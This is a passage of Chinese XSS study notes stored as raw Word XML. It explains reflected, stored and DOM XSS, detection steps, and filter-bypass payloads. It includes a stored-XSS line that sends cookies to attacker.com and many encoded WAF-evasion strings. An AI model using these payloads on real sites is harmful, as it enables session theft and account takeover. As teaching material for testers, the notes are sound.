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C8E"/>
          <w:sz w:val="56"/>
        </w:rPr>
        <w:t>跨站脚本攻击（XSS）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>学习笔记 · 从原理到实战</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="999999"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>整理日期：2026年06月14日</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>目 录</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:t>一、XSS 概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:t>二、XSS 三大分类详解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:ind w:left="850"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    2.1 反射型 XSS（Reflected XSS）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:ind w:left="850"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    2.2 存储型 XSS（Stored XSS）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:ind w:left="850"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    2.3 DOM 型 XSS（DOM-based XSS）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:t>三、XSS 检测方法</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:t>四、XSS 绕过技巧</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:t>五、XSS 利用场景</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:t>六、XSS 实战利用进阶</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:ind w:left="850"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    6.1 窃取 Cookie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:ind w:left="850"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    6.2 BeEF 浏览器控制</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:ind w:left="850"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    6.3 后门上传与 Webshell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:t>七、Cookie vs Session vs JWT 讨论</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:t>八、HttpOnly 及绕过</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:t>九、XSS 防御建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>一、XSS 概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>XSS 全称 Cross-Site Scripting（跨站脚本攻击）。之所以叫 XSS 而不是 CSS，是因为 CSS 已经被"层叠样式表（Cascading Style Sheets）"占用了，为了区分，安全领域统一叫 XSS。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 什么是 XSS？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>XSS 是一种前端安全漏洞。攻击者将恶意 JavaScript 代码注入到网页中，当其他用户访问该页面时，浏览器会执行这段恶意代码。由于代码在受害者的浏览器中执行，攻击者可以：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>窃取用户的 Cookie / Session</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>伪造用户操作（发帖、转账等）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>钓鱼（伪造登录框骗取密码）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>键盘记录、截屏等</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>控制浏览器做进一步攻击（内网扫描等）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 XSS 产生根源</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>核心原因一句话：前端页面将用户输入的数据直接当成了代码来解析执行，而没有做充分的过滤或转义。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>二、XSS 三大分类详解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 反射型 XSS（Reflected XSS）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>特点：非持久化、一次性。恶意代码通过 URL 参数（GET/POST）传递到后端，后端未做过滤直接将其内容反射回页面显示。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>典型场景：搜索框，搜索关键词显示在页面上。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>攻击流程：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>攻击者构造恶意 URL：http://target.com/search?keyword=&lt;script&gt;alert(1)&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>通过钓鱼邮件、短链接等方式引诱受害者点击</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>受害者的浏览器执行恶意脚本</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>脚本将 Cookie 发送到攻击者服务器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示例 URL：</w:t>
        <w:br/>
        <w:t>http://target.com/search?keyword=&lt;script&gt;alert("XSS")&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="C0392B"/>
        </w:rPr>
        <w:t>⚠️ 注意：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>反射型 XSS 需要诱导用户点击链接，一般无法直接"挂马"持久化。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 存储型 XSS（Stored XSS）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>特点：持久化。恶意代码被永久存储在服务器（数据库、文件系统等），每次用户访问相关页面时都会触发，危害远大于反射型。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>典型场景：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>留言板 / 评论区（提交评论内容包含恶意脚本）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>个人资料页（昵称、签名、简介字段）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>订单系统（收货人姓名、备注）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>论坛帖子内容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留言板示例：</w:t>
        <w:br/>
        <w:t>评论内容：&lt;script&gt;document.location="http://attacker.com/steal?cookie="+document.cookie&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>当管理员或其他用户查看留言时，脚本自动执行，Cookie 被发送到攻击者服务器。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 DOM 型 XSS（DOM-based XSS）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>特点：纯前端漏洞，恶意代码不经过后端。攻击代码通过修改页面 DOM 环境触发，数据流为：URL → 浏览器 JS 解析 → DOM 操作 → 页面渲染。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.3.1 原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>页面的 JavaScript 代码不安全地使用了用户可控的数据（如 URL 参数、location.hash、document.referrer 等）来修改 DOM。攻击者构造特殊的 URL，让受害者的浏览器执行了非预期的 JavaScript 代码。整个过程中请求可能根本没有发到后端。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.3.2 常见触发点</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>document.write() — 直接写入未转义的内容</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>innerHTML — 将用户数据插入 HTML</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>eval() — 执行拼接后的字符串</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>location / location.hash / location.search — 从 URL 取值后操作 DOM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>window.name — 跨窗口数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.3.3 典型示例</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>场景：一个页面通过 URL 中的 # 号参数来控制页面内容显示。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&lt;html&gt;</w:t>
        <w:br/>
        <w:t>&lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;div id="content"&gt;&lt;/div&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;script&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // 从 URL 获取 hash 值直接写入页面</w:t>
        <w:br/>
        <w:t xml:space="preserve">    var hash = location.hash.substring(1);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    document.getElementById("content").innerHTML = hash;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;/script&gt;</w:t>
        <w:br/>
        <w:t>&lt;/body&gt;</w:t>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>攻击者构造以下 URL：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http://target.com/page.html#&lt;img src=x onerror=alert("DOM-XSS")&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>当用户访问这个 URL 时，浏览器直接解析执行了 onerror 中的 JavaScript。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.3.4 常见疑问解答（DOM型）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1A5C8E"/>
        </w:rPr>
        <w:t>❓ DOM型XSS中的"加代码"是怎么加的？是用 onclick 函数吗？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2D6B2D"/>
        </w:rPr>
        <w:t>✅ DOM型XSS不限于onclick。核心是：JS从URL/窗口等地方取到用户可控的数据，然后用 innerHTML、document.write、eval 等方式"直接插入"页面。onclick 只是其中一种载荷形式（事件处理器），更常见的是 &lt;img onerror&gt;、&lt;script&gt;、&lt;svg onload&gt;、&lt;a href="javascript:..."&gt; 等。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1A5C8E"/>
        </w:rPr>
        <w:t>❓ href标签怎么加代码？举几个例子？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2D6B2D"/>
        </w:rPr>
        <w:t>✅ 当然！以下几种方式都可行：</w:t>
        <w:br/>
        <w:t>① &lt;a href="javascript:alert(1)"&gt;点我&lt;/a&gt; — 点击执行 JS</w:t>
        <w:br/>
        <w:t>② &lt;a href="#" onclick="alert(1)"&gt;点我&lt;/a&gt; — 点击执行 JS</w:t>
        <w:br/>
        <w:t>③ 如果是 JS 动态设置 href：element.innerHTML = "&lt;a href=\"'+userInput+'\"&gt;链接&lt;/a&gt;"，用户输入 javascript:alert(1) 即可触发</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1A5C8E"/>
        </w:rPr>
        <w:t>❓ DOM型XSS的参数传递方式？也是通过URL参数吗？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2D6B2D"/>
        </w:rPr>
        <w:t>✅ 是的，最常见的就是通过 URL 参数（location.search 即 ? 后面的参数）或 URL 锚点（location.hash 即 # 后面的内容）。还有 location.pathname、document.referrer、window.name、postMessage 等前端可控的数据源。跟反射型的区别是：DOM型不需要后端参与，纯前端发生。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>三、XSS 检测方法</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>检测一个输入点是否存在 XSS，通常按以下步骤进行：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 基础 Payload 测试</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>用最简单的 payload 测试是否执行：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① &lt;script&gt;alert("123")&lt;/script&gt;</w:t>
        <w:br/>
        <w:t>② &lt;img src="x" onerror="alert('XSS')"&gt;</w:t>
        <w:br/>
        <w:t>③ "&gt;&lt;script&gt;alert(1)&lt;/script&gt;</w:t>
        <w:br/>
        <w:t>④ '&gt;&lt;script&gt;alert(1)&lt;/script&gt;</w:t>
        <w:br/>
        <w:t>⑤ &lt;a href="javascript:alert(1)"&gt;test&lt;/a&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 查看网页源代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>提交 payload 后，在浏览器右键 → 查看网页源代码（或 F12 → Elements），观察你输入的内容是否被转义：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>输入 &lt;script&gt; 后，源代码中显示 &amp;lt;script&amp;gt; → 被 HTML 实体转义了</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>输入 &lt;script&gt; 后，源代码中就是 &lt;script&gt; → 未转义，可能存在XSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>输入 "&gt;&lt;img 后，源代码中变成 "&amp;gt;&lt;img → 引号和尖括号都被处理了</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 不同上下文测试</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>同一个输入出现在页面的不同位置，payload 也需要变化：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>在 HTML 标签内（如 &lt;div&gt;输入&lt;/div&gt;）：直接测 &lt;script&gt;alert(1)&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>在 HTML 属性内（如 &lt;input value="输入"&gt;）：需要先闭合引号 " onfocus=alert(1) autofocus&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>在 JavaScript 字符串内（如 var msg="输入"）：需要先闭合引号 ");alert(1)//</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>在 URL 内（如 &lt;a href="输入"&gt;）：测 javascript:alert(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 关于"查看更多/加载更多"页面的检测</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1A5C8E"/>
        </w:rPr>
        <w:t>❓ 那种"查看更多"或"加载更多"的页面，是通过参数传递吗？跟SQL注入或异步加载有关吗？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2D6B2D"/>
        </w:rPr>
        <w:t>✅ 这个点问得好！"加载更多"通常有两种实现方式：</w:t>
        <w:br/>
        <w:t>① Ajax 异步加载（最常见）— 前端通过 JS 发送请求（通常在 URL 或 POST body 中带 page/pageNum/offset 参数），后端返回 JSON/HTML，前端动态插入到 DOM 中。这里的参数可能同时存在 SQL 注入和 XSS 两条检测路径。</w:t>
        <w:br/>
        <w:t>② 页面跳转 — 通过 ?page=2 参数整页刷新。</w:t>
        <w:br/>
        <w:br/>
        <w:t>检测方法：用 Burp Suite 抓"加载更多"的请求包，构造 XSS payload 放到参数值里，看返回数据中是否被转义。如果后端对返回的 JSON 数据没做前端转义，且前端直接 innerHTML 拼接，就能触发 DOM型XSS。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>四、XSS 绕过技巧</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>实际场景中网站通常会有 WAF 或过滤规则，不会让你直接用 &lt;script&gt; 就成功。以下是常见绕过思路：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 大小写混用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&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>如果 WAF 只匹配全小写的 &lt;script&gt;，大小写混用即可绕过。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 双写绕过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&lt;scscriptript&gt;alert(1)&lt;/scscriptript&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>如果服务器过滤了 "script" 并将其替换为空，双写后过滤一次刚好拼回 &lt;script&gt;。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 更改标签 / 换事件处理器</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>绕过 &lt;script&gt; 过滤，使用 HTML 事件标签：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&lt;img src="x" onerror="alert(1)"&gt;</w:t>
        <w:br/>
        <w:t>&lt;svg onload="alert(1)"&gt;</w:t>
        <w:br/>
        <w:t>&lt;body onload="alert(1)"&gt;</w:t>
        <w:br/>
        <w:t>&lt;details open ontoggle="alert(1)"&gt;</w:t>
        <w:br/>
        <w:t>&lt;input onfocus="alert(1)" autofocus&gt;</w:t>
        <w:br/>
        <w:t>&lt;video&gt;&lt;source onerror="alert(1)"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 拆分绕过 / 编码绕过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// 用 HTML 实体编码绕过</w:t>
        <w:br/>
        <w:t>&lt;img src="x" onerror="&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)"&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t>// 用 URL 编码</w:t>
        <w:br/>
        <w:t>&lt;a href="javascript:%61%6c%65%72%74(1)"&gt;test&lt;/a&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t>// 用 Unicode 编码</w:t>
        <w:br/>
        <w:t>&lt;script&gt;\u0061lert(1)&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.5 不带括号的执行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&lt;script&gt;onerror=alert;throw 1&lt;/script&gt;</w:t>
        <w:br/>
        <w:t>&lt;img src=x onerror="eval('alert\u00281\u0029')"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.6 组合绕过示例</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>当 WAF 检测严格时，可以组合使用多种技巧：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&lt;svg/onload=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</w:t>
        <w:br/>
        <w:t>&lt;Img SrC=x OnErRor="alert(1)"&gt;</w:t>
        <w:br/>
        <w:t>&lt;details%0Aopen%0Dontoggle=confirm()&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>五、XSS 利用场景</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>XSS 在以下场景中经常出现：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>留言板 / 评论区 — 用户输入内容被展示，容易触发存储型 XSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>论坛帖子 / 文章发布 — 富文本编辑器可能过滤不严</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>订单系统 — 收货地址、备注等字段</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>搜索框 — 搜索关键词显示在结果页中</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>用户个人资料 — 昵称、签名、简介、头像链接等</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>反馈/投诉表单 — 提交内容被客服后台查看</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>错误提示页 — 错误信息包含用户输入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="C0392B"/>
        </w:rPr>
        <w:t>💡 提示：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>一个关键的判断标准：用户提交的数据，提交后刷新页面，该数据会再次从后端返回到前端显示。只要是"数据流转一圈又显示出来"的地方，都值得测 XSS。</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>关于"数据从后端返回时一般都会被加密或转义"的问题：</w:t>
        <w:br/>
        <w:t>实际上大多数网站会对特殊字符做 HTML 实体转义（&lt; → &amp;lt;，&gt; → &amp;gt;，' → &amp;#39;，" → &amp;quot;）。但转义不彻底的情况非常常见，比如：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>只转义了 &lt; 和 &gt;，但没转义引号 → 可闭合属性</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>在 JavaScript 代码块里插值，没转义反斜杠 → 可闭合字符串</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>富文本编辑器的白名单过滤不严 → 允许了某些危险标签</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>某些字段（如 JSONP 回调函数名）根本没有转义</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>六、XSS 实战利用进阶</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
